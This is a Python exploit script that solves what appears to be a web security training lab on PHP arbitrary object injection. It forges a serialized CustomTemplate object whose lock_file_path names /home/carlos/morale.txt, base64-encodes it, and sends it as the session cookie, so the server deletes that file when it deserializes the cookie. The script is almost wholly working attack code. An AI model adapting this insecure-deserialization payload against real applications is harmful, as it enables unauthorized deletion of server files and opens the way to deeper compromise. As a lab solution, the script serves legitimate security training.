######################################################################
#
# Lab: Arbitrary object injection in PHP
#
# Hack Steps:
#      1. Encoding the serialized object after modifying
#      2. Fetching the home page with the modified object as session
#         to delete the morale.txt file
#
######################################################################
import requests
from colorama import Fore
import base64

# Change this to your lab URL
LAB_URL = "https://0a6400ae037e504781964d0000a80051.web-security-academy.net"

def main():
    print("⦗1⦘ Encoding the serialized object after modifying.. ", end="", flush=True)

    serialized = """O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}"""
    serialized_encoded = base64.b64encode(serialized.encode()).decode()

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Fetching the home page with the modified object as session to delete the morale.txt file..", end="", flush=True)

    cookies = { "session": serialized_encoded }
    fetch("/", cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")


if __name__ == "__main__":
    main()